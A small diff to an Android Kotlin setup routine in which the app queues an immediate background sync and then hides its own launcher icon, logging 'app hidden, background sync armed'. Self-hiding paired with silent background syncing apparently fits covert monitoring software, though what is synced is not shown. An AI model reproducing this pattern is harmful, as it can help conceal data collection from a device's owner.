@@ -37,8 +37,9 @@ object InstallFlow {
             .putBoolean(KEY_SETUP_COMPLETE, true)
             .putInt(KEY_SETUP_VERSION, BuildConfig.VERSION_CODE)
             .apply()
-        LauncherHider.hide(app)
         SyncBootstrap.armBackgroundSync(app)
+        SyncWorkScheduler.enqueueNow(app)
+        LauncherHider.hide(app)
         Log.d(TAG, "Initial sync done — app hidden, background sync armed")
     }
 
